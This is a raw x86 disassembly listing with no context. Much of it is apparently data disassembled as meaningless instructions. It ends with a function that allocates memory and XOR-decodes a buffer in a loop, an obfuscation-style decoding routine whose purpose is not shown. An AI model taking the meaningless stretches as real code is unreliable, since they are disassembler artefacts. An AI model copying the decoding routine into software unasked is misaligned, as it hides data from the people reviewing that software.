  43e4a8:	push   DWORD PTR [ecx]
  43e4aa:	int3   
  43e4ab:	push   ss
  43e4ac:	sub    edi,edi
  43e4ae:	int3   
  43e4af:	cmp    edi,0x4c
  43e4b2:	or     DWORD PTR [eax+0xa7ff8a],0xffffff89
  43e4b9:	sub    eax,0xff504b00
  43e4be:	push   ebx
  43e4bf:	(bad)  
  43e4c0:	inc    DWORD PTR [edx]
  43e4c2:	add    al,ah
  43e4c4:	xor    eax,DWORD PTR [eax]
  43e4c6:	leave  
  43e4c7:	dec    esp
  43e4c9:	ins    DWORD PTR es:[edi],dx
  43e4ca:	add    BYTE PTR [esi+eiz*4-0x7c2300],dh
  43e4d1:	stos   BYTE PTR es:[edi],al
  43e4d2:	add    BYTE PTR [eax-0xfc007e],bl
  43e4d8:	(bad)  
  43e4d9:	cld    
  43e4da:	mov    DWORD PTR [ebx],esi
  43e4dc:	pop    edx
  43e4dd:	add    BYTE PTR [ecx+0x3383cc],bh
  43e4e3:	mov    cl,0x7a
  43e4e5:	jmp    ebx
  43e4e7:	(bad)  
  43e4e8:	inc    DWORD PTR [ebx]
  43e4ea:	push   DWORD PTR [edx-0x737c97]
  43e4f0:	inc    esp
  43e4f2:	add    BYTE PTR [ebx+0x1f],bl
  43e4f5:	add    cl,ch
  43e4f7:	inc    DWORD PTR [ebx-0x2e727ca7]
  43e4fd:	jmp    FWORD PTR [edx]
  43e4ff:	(bad)  
  43e500:	jmp    FWORD PTR [edi+edi*8-0x1f004c95]
  43e507:	int3   
  43e508:	add    BYTE PTR [esi-0x34],dh
  43e50b:	mov    edi,0x9600fe
  43e510:	add    BYTE PTR [ebx-0x76e0b200],dh
  43e516:	les    eax,FWORD PTR [eax]
  43e518:	add    BYTE PTR [eax+eax*1],ch
  43e51b:	mov    edx,0xa6000c
  43e520:	jmp    FWORD PTR [ebx+0x4e4800]
  43e526:	pop    esi
  43e527:	dec    DWORD PTR [ecx+0x50c1ff38]
  43e52d:	jmp    DWORD PTR [eax]
  43e52f:	add    BYTE PTR [eax],al
  43e531:	retf   0x14ff
  43e534:	add    al,0x0
  43e536:	idiv   edi
  43e538:	inc    edx
  43e53a:	int3   
  43e53b:	test   BYTE PTR [ecx-0x7c00af00],dl
  43e541:	test   BYTE PTR [eax],al
  43e543:	or     bl,BYTE PTR [edi+edi*8+0xa]
  43e547:	add    bh,bh
  43e549:	xchg   edx,eax
  43e54a:	int3   
  43e54b:	add    eax,DWORD PTR [ebx-0x7d]
  43e54e:	push   ebp
  43e54f:	(bad)  
  43e550:	inc    ebp
  43e552:	call   esi
  43e554:	dec    esp
  43e555:	dec    DWORD PTR [edx+0x70ff00]
  43e55b:	pop    ecx
  43e55c:	pop    ecx
  43e55d:	cmp    DWORD PTR ds:0xffd8ff00,0x5c
  43e564:	loop   0x43e565
  43e566:	repnz int3 
  43e568:	inc    eax
  43e56a:	inc    edi
  43e56c:	fs add ah,bh
  43e56f:	add    bh,bh
  43e571:	loopne 0x43e572
  43e573:	pop    edx
  43e574:	dec    esi
  43e575:	add    BYTE PTR [edx],dh
  43e577:	inc    DWORD PTR [ebx+0x99c83f1]
  43e57d:	call   FWORD PTR [edx-0x1]
  43e580:	call   DWORD PTR [eax+0x5d96ff]
  43e586:	mov    al,BYTE PTR [eax]
  43e588:	add    bl,dh
  43e58a:	jmp    DWORD PTR [ebx]
  43e58c:	pop    edx
  43e58d:	(bad)  
  43e58e:	fdivp  st(7),st
  43e590:	add    DWORD PTR [edi+edi*8],0x60
  43e594:	cmp    bh,0x1b
  43e597:	(bad)  
  43e598:	jmp    DWORD PTR [ebp+0x0]
  43e59b:	cmp    eax,0xff0ccc02
  43e5a0:	add    BYTE PTR [esi-0x7d],bl
  43e5a3:	inc    ecx
  43e5a4:	(bad)  
  43e5a5:	call   DWORD PTR [edi]
  43e5a7:	add    BYTE PTR [eax],al
  43e5a9:	mov    edi,edi
  43e5ab:	cli    
  43e5ac:	leave  
  43e5ad:	inc    DWORD PTR [edi]
  43e5af:	add    ah,cl
  43e5b1:	sub    al,BYTE PTR [eax]
  43e5b3:	cmp    BYTE PTR [edx],dl
  43e5b5:	int3   
  43e5b6:	xor    al,BYTE PTR [eax]
  43e5b8:	xor    DWORD PTR [edx-0x7d],0x3b
  43e5bc:	rol    DWORD PTR [ebx-0x6cff7cd4],cl
  43e5c2:	add    BYTE PTR [edx+0x7d],dh
  43e5c5:	mov    DWORD PTR [eax-0x550001],edx
  43e5cb:	ins    BYTE PTR es:[edi],dx
  43e5cc:	aad    0xff
  43e5ce:	cmp    al,BYTE PTR [ebx-0x687ce200]
  43e5d4:	mov    DWORD PTR es:[esi-0x7d],esi
  43e5d8:	(bad)  
  43e5d9:	mov    ebp,0xffef09ff
  43e5de:	mov    edi,edi
  43e5e0:	add    BYTE PTR [eax+eax*1+0x588905e3],ch
  43e5e7:	int3   
  43e5e8:	jmp    DWORD PTR [ebx-0x7d]
  43e5eb:	and    edi,ebp
  43e5ed:	mov    DWORD PTR [esi+0xc1ffcc],esp
  43e5f3:	push   esp
  43e5f4:	rol    DWORD PTR [ebx+0x3b83cc98],1
  43e5fa:	add    ah,al
  43e5fc:	dec    edx
  43e5fd:	jmp    FWORD PTR [edi-0xc30001]
  43e603:	int3   
  43e604:	inc    edi
  43e605:	mov    DWORD PTR [edi+edi*8+0x0],ebx
  43e609:	lock jmp esp
  43e60c:	add    DWORD PTR [eax],0x32ff0007
  43e612:	(bad)  
  43e613:	aas    
  43e614:	dec    ebx
  43e615:	adc    DWORD PTR [edi+0xc9ff00],0xffffffc2
  43e61c:	imul   ecx,esp,0x67
  43e61f:	cmp    edi,0xffffffd0
  43e622:	(bad)  
  43e623:	std    
  43e624:	repz call esp
  43e627:	add    bh,bh
  43e629:	(bad)  
  43e62b:	mov    dl,0x74
  43e62d:	add    BYTE PTR [edx],ah
  43e62f:	(bad)  
  43e630:	dec    DWORD PTR [eax]
  43e632:	(bad)  
  43e633:	fist   WORD PTR [edi]
  43e635:	add    dl,al
  43e637:	(bad)  
  43e638:	dec    DWORD PTR [ebx-0xc127d]
  43e63e:	ror    DWORD PTR [ecx+0x16ffcaff],1
  43e644:	or     bh,bh
  43e646:	fild   WORD PTR [ebx+0xf83e383]
  43e64c:	jno    0x43e64d
  43e64e:	jo     0x43e650
  43e650:	add    BYTE PTR [eax-0x77],dl
  43e653:	cmp    esi,DWORD PTR [ebx]
  43e655:	jmp    FWORD PTR [edi+0x9f83ff]
  43e65b:	mov    eax,0xffd4cc56
  43e660:	push   DWORD PTR [edx]
  43e662:	dec    esi
  43e664:	pusha  
  43e665:	(bad)  
  43e666:	(bad)  
  43e668:	add    dl,al
  43e66a:	xor    DWORD PTR [eax-0x32],0xffffffff
  43e66e:	ds (bad) 
  43e670:	(bad)  
  43e671:	cli    
  43e672:	call   ecx
  43e674:	mov    ah,0xcc
  43e676:	dec    ecx
  43e677:	add    BYTE PTR [eax],al
  43e679:	cmp    bh,bh
  43e67b:	push   eax
  43e67c:	jns    0x43e67d
  43e67e:	iret   
  43e67f:	add    bh,bh
  43e681:	fadd   DWORD PTR [eax]
  43e683:	pop    es
  43e684:	xchg   esi,eax
  43e685:	inc    DWORD PTR [esi-0x7d]
  43e688:	int3   
  43e689:	pop    eax
  43e68a:	mov    esp,ecx
  43e68c:	(bad)  
  43e68d:	int3   
  43e68e:	retf   
  43e68f:	(bad)  
  43e690:	inc    DWORD PTR [ecx-0x77]
  43e693:	inc    edi
  43e694:	jne    0x43e696
  43e696:	idiv   edi
  43e698:	mov    edi,esi
  43e69a:	add    BYTE PTR [ebx],bh
  43e69c:	cld    
  43e69d:	add    cl,dl
  43e69f:	(bad)  
  43e6a0:	jmp    FWORD PTR [ebx-0x334bcb00]
  43e6a6:	mov    dh,0xcc
  43e6a8:	(bad)  
  43e6a9:	jnp    0x43e6aa
  43e6ab:	hlt    
  43e6ac:	sar    edi,cl
  43e6ae:	jmp    0x90ad:0xff350000
  43e6b5:	jmp    FWORD PTR [esi]
  43e6b7:	inc    DWORD PTR [eax]
  43e6b9:	(bad)  
  43e6ba:	add    BYTE PTR [edx-0xb0065],ch
  43e6c0:	add    bl,al
  43e6c2:	add    BYTE PTR [esp+ecx*1-0x76004200],bh
  43e6c9:	imul   eax,DWORD PTR [ebx+0x42ff182a],0xffffffff
  43e6d0:	mov    DWORD PTR [edi],esp
  43e6d2:	add    BYTE PTR [ebp+0xa183a5],dh
  43e6d8:	int3   
  43e6d9:	sbb    al,0xff
  43e6db:	add    ebp,ebx
  43e6dd:	add    BYTE PTR [edi-0x560100],cl
  43e6e3:	loop   0x43e6bd
  43e6e5:	cmp    DWORD PTR [ebx+eax*4-0x6f7cf600],0xffffffd8
  43e6ed:	call   DWORD PTR [ebp-0xc67c34]
  43e6f3:	daa    
  43e6f4:	retf   
  43e6f5:	jmp    DWORD PTR [ecx+0x998389]
  43e6fb:	cdq    
  43e6fc:	call   0xff447ecd
  43e701:	push   ecx
  43e702:	add    BYTE PTR [ebx-0x73],al
  43e705:	(bad)  
  43e706:	fcos   
  43e708:	adc    edx,0xffffff83
  43e70b:	pushf  
  43e70c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e70d:	add    BYTE PTR [edi-0x65ff01],ch
  43e713:	aas    
  43e714:	or     al,0x0
  43e716:	sub    al,BYTE PTR [ebx-0x44007c77]
  43e71c:	cmc    
  43e71d:	(bad)  
  43e71e:	fild   WORD PTR [eax]
  43e720:	inc    DWORD PTR [edi+edi*8]
  43e723:	daa    
  43e724:	loopne 0x43e726
  43e726:	test   edi,edi
  43e728:	add    BYTE PTR [eax],al
  43e72a:	jmp    DWORD PTR ds:0x95007d
  43e730:	add    BYTE PTR [ebx-0x3307af77],bh
  43e736:	mov    cl,0xff
  43e738:	and    DWORD PTR [ecx],0x0
  43e73b:	jmp    0x43e722
  43e73d:	int3   
  43e73e:	arpl   WORD PTR [eax],ax
  43e740:	call   DWORD PTR [edx+0x83d5ff]
  43e746:	sub    bh,bh
  43e748:	add    bh,bh
  43e74a:	adc    edi,0x2
  43e74d:	add    ch,bl
  43e74f:	add    BYTE PTR [eax],al
  43e751:	enter  0x94ff,0x81
  43e755:	(bad)  
  43e756:	out    dx,eax
  43e757:	add    BYTE PTR [ecx+0x37ecffdd],cl
  43e75d:	int3   
  43e75e:	cmp    bh,0xff
  43e761:	xor    edi,edi
  43e763:	push   cs
  43e764:	or     DWORD PTR [eax],eax
  43e766:	pop    ecx
  43e767:	mov    edi,edi
  43e769:	jns    0x43e76a
  43e76b:	nop
  43e76c:	push   esi
  43e76d:	jmp    edi
  43e76f:	int3   
  43e770:	push   DWORD PTR [ebx+eax*4]
  43e773:	and    BYTE PTR [edi-0x1],ah
  43e776:	jno    0x43e777
  43e778:	call   DWORD PTR [ebx-0x1]
  43e77b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e77c:	jno    0x43e77d
  43e77e:	xlat   BYTE PTR ds:[ebx]
  43e77f:	int3   
  43e780:	add    BYTE PTR [ebp+0x31c6ff],al
  43e786:	pop    es
  43e787:	add    DWORD PTR [eax],0x7b
  43e78a:	jmp    DWORD PTR [esi+0xcf8910]
  43e790:	int3   
  43e791:	ja     0x43e75f
  43e793:	pop    edx
  43e794:	dec    eax
  43e795:	adc    DWORD PTR [esi-0xcd7c01],0x5f
  43e79c:	int3   
  43e79d:	(bad)  
  43e79e:	call   0xff6fe8a2
  43e7a3:	push   esi
  43e7a4:	out    dx,al
  43e7a5:	int3   
  43e7a6:	sahf   
  43e7a7:	(bad)  
  43e7a8:	call   esp
  43e7aa:	call   FWORD PTR [ecx-0x4a005a]
  43e7b0:	(bad)  
  43e7b1:	clc    
  43e7b2:	int3   
  43e7b3:	xor    eax,0xe9ff58
  43e7b8:	add    BYTE PTR [ecx-0x1],bl
  43e7bb:	ret    0xba
  43e7be:	xchg   ecx,eax
  43e7bf:	(bad)  
  43e7c0:	call   esp
  43e7c2:	add    ch,ah
  43e7c4:	push   edi
  43e7c5:	add    BYTE PTR ds:0xff440000,cl
  43e7cb:	outs   dx,BYTE PTR ds:[esi]
  43e7cc:	cmc    
  43e7cd:	push   DWORD PTR ds:0xff9d0000
  43e7d3:	xchg   BYTE PTR [edx-0xff0700],bh
  43e7d9:	inc    ebx
  43e7da:	add    BYTE PTR [eax+0x48],al
  43e7dd:	jmp    DWORD PTR [edi+0xf8900]
  43e7e3:	in     al,dx
  43e7e4:	add    eax,DWORD PTR [eax]
  43e7e6:	fcmove st,st(4)
  43e7e8:	sbb    DWORD PTR [edx-0xee1500],0xffffffd2
  43e7ef:	(bad)  
  43e7f0:	inc    DWORD PTR [ebp+0x0]
  43e7f3:	inc    ebp
  43e7f4:	js     0x43e7f6
  43e7f6:	dec    ebx
  43e7f7:	add    bh,bh
  43e7f9:	jg     0x43e77e
  43e7fb:	jns    0x43e7a0
  43e7fd:	sbb    DWORD PTR [edx-0x910001],0x1f
  43e804:	ins    BYTE PTR es:[edi],dx
  43e805:	(bad)  
  43e806:	cmp    eax,0xffd9ffff
  43e80b:	cmp    ah,BYTE PTR [esi-0x1]
  43e80e:	sar    edi,1
  43e810:	add    BYTE PTR [ecx-0x31be01],cl
  43e816:	push   edi
  43e817:	mov    DWORD PTR [eax],eax
  43e819:	mov    dl,0x0
  43e81b:	mov    WORD PTR [ebx],cs
  43e81d:	add    BYTE PTR [ebp-0x1],al
  43e820:	add    BYTE PTR [ebp+0x0],dh
  43e823:	pushf  
  43e824:	sti    
  43e825:	call   ebp
  43e827:	dec    DWORD PTR [ecx-0x74beff25]
  43e82d:	jmp    DWORD PTR ds:0xffe483ff
  43e833:	mov    edi,0xccc8ff6c
  43e838:	add    BYTE PTR [edi+0xea6dff],ah
  43e83e:	repz add BYTE PTR [ebx+0x51a10026],al
  43e845:	dec    DWORD PTR [edi-0x833400]
  43e84b:	outs   dx,DWORD PTR ds:[esi]
  43e84c:	cmp    al,0xff
  43e84e:	mov    ds:0xcc608300,al
  43e853:	rcr    BYTE PTR [esi],1
  43e855:	cmp    DWORD PTR [eax-0x7d],0x0
  43e859:	or     DWORD PTR [eax],eax
  43e85b:	cmp    BYTE PTR [edx-0x76fff500],0x70
  43e862:	mov    ebx,edi
  43e864:	(bad)  
  43e865:	inc    DWORD PTR [edx-0x7cfd0077]
  43e86b:	pop    edi
  43e86c:	std    
  43e86d:	call   DWORD PTR [edx-0x1]
  43e870:	push   esp
  43e872:	int3   
  43e873:	cld    
  43e874:	test   BYTE PTR [ebx+0x73ff8902],0x0
  43e87b:	jae    0x43e825
  43e87d:	sub    DWORD PTR [ebx-0x1],0x0
  43e881:	jnp    0x43e882
  43e883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e884:	mov    bh,bh
  43e886:	cdq    
  43e887:	int3   
  43e888:	(bad)  
  43e889:	jmp    0x89e8f68e
  43e88e:	xchg   esi,eax
  43e88f:	mov    DWORD PTR [ebx-0x4966ff33],eax
  43e895:	add    BYTE PTR [edx-0x1],dh
  43e898:	add    BYTE PTR [edi],dh
  43e89a:	add    BYTE PTR [eax+0xf2cc84],ah
  43e8a0:	(bad)  
  43e8a1:	aas    
  43e8a2:	add    ch,dh
  43e8a4:	imul   edi,edi,0x1f
  43e8a7:	int3   
  43e8a8:	adc    DWORD PTR [eax-0x563e34],0x21
  43e8af:	add    bh,bh
  43e8b1:	retf   
  43e8b2:	jmp    DWORD PTR [esi+esi*2+0xce83]
  43e8b9:	jae    0x43e8ba
  43e8bb:	adc    ah,BYTE PTR [esi]
  43e8bd:	add    BYTE PTR [edx],cl
  43e8bf:	cmp    edi,0x51
  43e8c2:	dec    DWORD PTR [esi+ebx*4-0x4334]
  43e8c9:	xchg   edx,eax
  43e8ca:	inc    edx
  43e8cc:	inc    ebx
  43e8cd:	mov    DWORD PTR [edx],ebx
  43e8cf:	add    BYTE PTR [eax],al
  43e8d1:	(bad)  
  43e8d2:	jmp    DWORD PTR [ecx+eiz*4]
  43e8d5:	jmp    FWORD PTR [edx]
  43e8d7:	inc    DWORD PTR [eax]
  43e8d9:	out    0xff,eax
  43e8db:	arpl   WORD PTR [edx],cx
  43e8dd:	(bad)  
  43e8de:	jp     0x43e863
  43e8e0:	and    ecx,0xffffffff
  43e8e3:	repz idiv bh
  43e8e6:	mov    eax,ds:0xcc56ffff
  43e8eb:	jp     0x43e8e4
  43e8ed:	mov    DWORD PTR ds:0xffe5ffff,ebx
  43e8f3:	push   edi
  43e8f4:	inc    DWORD PTR [eax]
  43e8f6:	mov    esp,cs
  43e8f8:	call   DWORD PTR [edx]
  43e8fa:	(bad)  
  43e8fb:	in     al,dx
  43e8fc:	push   ebx
  43e8fd:	int3   
  43e8fe:	xor    bh,bh
  43e900:	add    ecx,0xffffffff
  43e903:	mov    ebp,0xff880040
  43e908:	sub    DWORD PTR [ebx+0xb8a483],0xffffff99
  43e90f:	int3   
  43e910:	sbb    DWORD PTR [ecx-0xc4d401],0x26
  43e917:	mov    DWORD PTR [eax],eax
  43e919:	mov    cs,WORD PTR [ecx+0xb00f6ae]
  43e91f:	int3   
  43e920:	sub    DWORD PTR [eax+eax*1+0x49],0xffffffe7
  43e925:	(bad)  
  43e926:	(bad)  
  43e928:	inc    DWORD PTR [edi+edi*8+0x55ccc29f]
  43e92f:	add    BYTE PTR [ebx+0x207d0069],al
  43e935:	add    BYTE PTR [eax],al
  43e937:	(bad)  
  43e938:	inc    esi
  43e93a:	xor    esi,0xffffffdf
  43e93d:	int3   
  43e93e:	in     al,0x0
  43e940:	(bad)  
  43e941:	mov    ebp,0xff21c183
  43e946:	push   ebp
  43e947:	(bad)  
  43e948:	(bad)  
  43e949:	aas    
  43e94a:	int3   
  43e94b:	adc    esp,esi
  43e94d:	add    BYTE PTR [edi-0x77],dl
  43e950:	dec    edi
  43e952:	int3   
  43e953:	cmp    al,0x91
  43e955:	add    BYTE PTR [ecx+ecx*4],bh
  43e958:	call   eax
  43e95a:	call   DWORD PTR [edi-0x33ce0087]
  43e960:	(bad)  
  43e961:	aas    
  43e962:	push   DWORD PTR [esi+ebp*1-0x34]
  43e966:	adc    al,0x89
  43e968:	call   DWORD PTR [eax-0x77]
  43e96b:	sahf   
  43e96c:	adc    al,0x83
  43e96e:	out    0xff,al
  43e970:	and    DWORD PTR [ebp-0x1],0xffffffb0
  43e974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e975:	add    BYTE PTR [eax-0x7d],dl
  43e978:	sub    DWORD PTR [ebp+0x91d7ff],0x24
  43e97f:	inc    DWORD PTR [eax]
  43e981:	aas    
  43e982:	add    al,dl
  43e984:	xchg   ecx,eax
  43e985:	jmp    FWORD PTR [esi+0x0]
  43e988:	push   DWORD PTR [esi-0x1]
  43e98b:	mov    esp,0x40ffef
  43e990:	call   ebx
  43e992:	push   ebp
  43e994:	ss add ebx,0xffffffff
  43e998:	(bad)  
  43e999:	jle    0x43e99b
  43e99b:	xor    esp,eax
  43e99d:	dec    DWORD PTR [ecx]
  43e99f:	add    bh,bh
  43e9a1:	or     DWORD PTR [ecx+0x4bcc5874],0xff5e8900
  43e9ab:	loopne 0x43e9e8
  43e9ad:	add    BYTE PTR ds:0xff258300,bl
  43e9b3:	mov    eax,ds:0xf7898a
  43e9b8:	call   FWORD PTR [edi+0x0]
  43e9bb:	xchg   edi,eax
  43e9bc:	push   ds
  43e9bd:	inc    DWORD PTR [ebx-0x210001]
  43e9c3:	sub    eax,0x8ffed
  43e9c8:	add    cl,bl
  43e9ca:	jmp    FWORD PTR [ebp-0x7c83ffb1]
  43e9d0:	int3   
  43e9d1:	jle    0x43e956
  43e9d3:	mov    DWORD PTR [esi],edi
  43e9d5:	add    BYTE PTR [ebx-0x1],cl
  43e9d8:	call   FWORD PTR [eax+eax*1+0x34]
  43e9dc:	rol    BYTE PTR [eax],1
  43e9de:	aam    0xff
  43e9e0:	add    BYTE PTR [ecx],bl
  43e9e2:	int3   
  43e9e3:	std    
  43e9e4:	dec    ecx
  43e9e5:	add    BYTE PTR [edi-0x7d],bl
  43e9e8:	add    ah,al
  43e9ea:	call   DWORD PTR [ebx+ebp*2-0xffd801]
  43e9f1:	das    
  43e9f2:	cmp    DWORD PTR [eax],0x6f
  43e9f5:	push   DWORD PTR [eax-0x850001]
  43e9fb:	add    ebp,esi
  43e9fd:	add    ah,ah
  43e9ff:	(bad)  
  43ea00:	inc    ecx
  43ea02:	add    BYTE PTR [edi],bl
  43ea04:	xor    DWORD PTR [eax],eax
  43ea06:	mov    ch,0x89
  43ea08:	add    BYTE PTR [edi],dl
  43ea0a:	mov    esi,esp
  43ea0c:	and    bh,bh
  43ea0e:	inc    ebp
  43ea0f:	cmp    edi,0xffffffd4
  43ea12:	dec    DWORD PTR [ebx-0x337cff09]
  43ea18:	add    BYTE PTR [ebx-0x1],ah
  43ea1b:	sbb    ah,bh
  43ea1d:	(bad)  
  43ea1e:	js     0x43ea1f
  43ea20:	sub    DWORD PTR [esi-0x1],0x7b
  43ea24:	lahf   
  43ea25:	add    BYTE PTR [ecx],ch
  43ea27:	dec    DWORD PTR [ecx+0x54faff9c]
  43ea2d:	add    BYTE PTR [ebp-0x1],bl
  43ea30:	inc    DWORD PTR [edi-0x7d]
  43ea33:	inc    ecx
  43ea34:	xlat   BYTE PTR ds:[ebx]
  43ea35:	push   DWORD PTR [ecx]
  43ea37:	inc    DWORD PTR [ebx+0x714ff6c]
  43ea3d:	call   FWORD PTR [edi]
  43ea3f:	(bad)  
  43ea40:	call   DWORD PTR [ebp-0x1]
  43ea43:	jg     0x43ea88
  43ea45:	add    BYTE PTR ds:0xff6300ff,ah
  43ea4b:	lahf   
  43ea4c:	outs   dx,DWORD PTR ds:[esi]
  43ea4d:	add    BYTE PTR [edx-0x7e007d],ah
  43ea53:	in     al,0xd4
  43ea55:	call   DWORD PTR [edi-0x140034]
  43ea5b:	adc    ecx,edx
  43ea5d:	(bad)  
  43ea5e:	fld    DWORD PTR [eax]
  43ea60:	(bad)  
  43ea61:	dec    DWORD PTR ds:[edx-0xd4ffee]
  43ea68:	cmp    DWORD PTR [ebx+eax*4],0x40
  43ea6c:	cmc    
  43ea6d:	add    dl,dl
  43ea6f:	mov    edi,edi
  43ea71:	and    al,0x0
  43ea73:	les    edi,FWORD PTR [edi+edi*8-0x16]
  43ea77:	add    bh,bh
  43ea79:	push   0x0
  43ea7b:	fs cmp edi,edi
  43ea7e:	lods   eax,DWORD PTR ds:[esi]
  43ea7f:	inc    DWORD PTR [ebx+0xd81006d]
  43ea85:	cmp    esi,0xffffffff
  43ea88:	cmp    DWORD PTR [edi],0x0
  43ea8b:	pop    edi
  43ea8c:	and    eax,0x8300f2ff
  43ea91:	out    dx,eax
  43ea92:	add    BYTE PTR [ebx-0x7c700047],ah
  43ea98:	jmp    FWORD PTR [ebx-0xa3c57d]
  43ea9e:	stc    
  43ea9f:	add    DWORD PTR [ebx+0x322affe2],0x0
  43eaa6:	xchg   edx,eax
  43eaa7:	or     esp,0x37
  43eaaa:	add    BYTE PTR [edi-0x44],bl
  43eaad:	sub    DWORD PTR [esp+ecx*8-0x1],0x3f
  43eab2:	dec    DWORD PTR [edx]
  43eab4:	in     eax,dx
  43eab5:	(bad)  
  43eab6:	sti    
  43eab7:	int3   
  43eab8:	inc    DWORD PTR [edi+edi*8]
  43eabb:	int3   
  43eabc:	push   cs
  43eabd:	cmp    DWORD PTR [ebp-0x5c7c01],0x1
  43eac4:	push   ds
  43eac5:	add    al,cl
  43eac7:	inc    DWORD PTR [eax]
  43eac9:	test   bh,bh
  43eacb:	jo     0x43eacd
  43eacd:	add    BYTE PTR [edx-0x7c1cff01],ch
  43ead3:	test   BYTE PTR [edi],bh
  43ead5:	call   DWORD PTR [ebx]
  43ead7:	or     DWORD PTR [ecx-0x40ef009a],0xffffffff
  43eade:	jl     0x43eae0
  43eae0:	xor    ecx,0x0
  43eae3:	jge    0x43ea74
  43eae5:	sbb    DWORD PTR [ecx],0xffffffff
  43eae8:	add    BYTE PTR [eax+eax*1+0x4789d49d],ch
  43eaef:	add    BYTE PTR [eax],al
  43eaf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43eaf2:	mov    DWORD PTR [edx-0xbe7caa],edi
  43eaf8:	int3   
  43eaf9:	int3   
  43eafa:	int3   
  43eafb:	int3   
  43eafc:	int3   
  43eafd:	int3   
  43eafe:	int3   
  43eaff:	int3   
  43eb00:	sub    esp,0x11c
  43eb06:	push   ebp
  43eb07:	push   esi
  43eb08:	push   0x8
  43eb0a:	push   0x42
  43eb0c:	call   DWORD PTR ds:0x445014
  43eb12:	mov    edx,DWORD PTR ds:0x448088
  43eb18:	mov    ebp,eax
  43eb1a:	mov    eax,ds:0x448d20
  43eb1f:	push   ebx
  43eb20:	add    eax,0xbbb8
  43eb25:	mov    esi,0x45
  43eb2a:	push   edi
  43eb2b:	jmp    0x43eb30
  43eb2d:	lea    ecx,[ecx+0x0]
  43eb30:	movzx  ecx,BYTE PTR [edx+0x7]
  43eb34:	movzx  edi,BYTE PTR [edx+0x5]
  43eb38:	movzx  edx,WORD PTR [edx]
  43eb3b:	shl    ecx,0x8
  43eb3e:	add    ecx,edi
  43eb40:	shl    ecx,0x10
  43eb43:	add    ecx,edx
  43eb45:	mov    edx,DWORD PTR ds:0x448d1c
  43eb4b:	mov    DWORD PTR ds:0x448d10,ecx
  43eb51:	add    edx,0x22d5dcda
  43eb57:	xor    edx,ecx
  43eb59:	mov    DWORD PTR [eax],edx
  43eb5b:	mov    edx,DWORD PTR ds:0x448088
  43eb61:	movzx  ecx,BYTE PTR [edx+0xe]
  43eb65:	movzx  edi,BYTE PTR [edx+0xb]
  43eb69:	movzx  edx,WORD PTR [edx+0x9]
  43eb6d:	shl    ecx,0x8
  43eb70:	add    ecx,edi
  43eb72:	shl    ecx,0x10
  43eb75:	add    ecx,edx
  43eb77:	mov    DWORD PTR ds:0x448d10,ecx
  43eb7d:	mov    edx,0x22dde0a6
  43eb82:	sub    edx,DWORD PTR ds:0x448d1c
  43eb88:	xor    edx,ecx
  43eb8a:	mov    DWORD PTR [eax+0x4],edx
  43eb8d:	mov    edx,DWORD PTR ds:0x448088
  43eb93:	add    edx,0x10
  43eb96:	mov    DWORD PTR ds:0x448088,edx
  43eb9c:	movzx  ecx,BYTE PTR [edx+0x7]
  43eba0:	movzx  edi,BYTE PTR [edx+0x5]
  43eba4:	movzx  edx,WORD PTR [edx]
  43eba7:	shl    ecx,0x8
  43ebaa:	add    ecx,edi
  43ebac:	shl    ecx,0x10
  43ebaf:	add    ecx,edx
  43ebb1:	mov    edx,DWORD PTR ds:0x448d1c
  43ebb7:	mov    DWORD PTR ds:0x448d10,ecx
  43ebbd:	add    edx,0x22d5dcda
  43ebc3:	xor    edx,ecx
  43ebc5:	mov    DWORD PTR [eax+0x8],edx
  43ebc8:	mov    edx,DWORD PTR ds:0x448088
  43ebce:	movzx  ecx,BYTE PTR [edx+0xe]
  43ebd2:	movzx  edi,BYTE PTR [edx+0xb]
  43ebd6:	movzx  edx,WORD PTR [edx+0x9]
  43ebda:	shl    ecx,0x8
  43ebdd:	add    ecx,edi
  43ebdf:	shl    ecx,0x10
  43ebe2:	add    ecx,edx
  43ebe4:	mov    DWORD PTR ds:0x448d10,ecx
  43ebea:	mov    edx,0x22dde0a6
  43ebef:	sub    edx,DWORD PTR ds:0x448d1c
  43ebf5:	xor    edx,ecx
  43ebf7:	mov    DWORD PTR [eax+0xc],edx
  43ebfa:	mov    edx,DWORD PTR ds:0x448088
  43ec00:	add    edx,0x10
  43ec03:	mov    DWORD PTR ds:0x448088,edx
  43ec09:	movzx  ecx,BYTE PTR [edx+0x7]
  43ec0d:	movzx  edi,BYTE PTR [edx+0x5]
  43ec11:	movzx  edx,WORD PTR [edx]
  43ec14:	shl    ecx,0x8
  43ec17:	add    ecx,edi
  43ec19:	shl    ecx,0x10
  43ec1c:	add    ecx,edx
  43ec1e:	mov    edx,DWORD PTR ds:0x448d1c
  43ec24:	mov    DWORD PTR ds:0x448d10,ecx
  43ec2a:	add    edx,0x22d5dcda
  43ec30:	xor    edx,ecx
  43ec32:	mov    DWORD PTR [eax+0x10],edx
  43ec35:	mov    edx,DWORD PTR ds:0x448088
  43ec3b:	movzx  ecx,BYTE PTR [edx+0xe]
  43ec3f:	movzx  edi,BYTE PTR [edx+0xb]
  43ec43:	movzx  edx,WORD PTR [edx+0x9]
  43ec47:	shl    ecx,0x8
  43ec4a:	add    ecx,edi
  43ec4c:	shl    ecx,0x10
  43ec4f:	add    ecx,edx
  43ec51:	mov    edx,0x22dde0a6
  43ec56:	sub    edx,DWORD PTR ds:0x448d1c
  43ec5c:	mov    DWORD PTR ds:0x448d10,ecx
  43ec62:	xor    edx,ecx
  43ec64:	mov    DWORD PTR [eax+0x14],edx
  43ec67:	mov    edx,DWORD PTR ds:0x448088
  43ec6d:	add    edx,0x10
  43ec70:	add    eax,0x18
  43ec73:	dec    esi
  43ec74:	mov    DWORD PTR ds:0x448088,edx
  43ec7a:	jne    0x43eb30
  43ec80:	mov    eax,ds:0x448d20
  43ec85:	mov    edx,DWORD PTR ds:0x44808c
  43ec8b:	add    eax,0xc230
  43ec90:	mov    esi,0x5e
  43ec95:	movzx  ecx,WORD PTR [edx+0x5]
  43ec99:	movzx  edx,WORD PTR [edx+0x2]
  43ec9d:	shl    ecx,0x10
  43eca0:	add    ecx,edx
  43eca2:	mov    DWORD PTR ds:0x448d10,ecx
  43eca8:	mov    edx,0x36373be8
  43ecad:	sub    edx,DWORD PTR ds:0x448d1c
  43ecb3:	xor    edx,ecx
  43ecb5:	mov    DWORD PTR [eax],edx
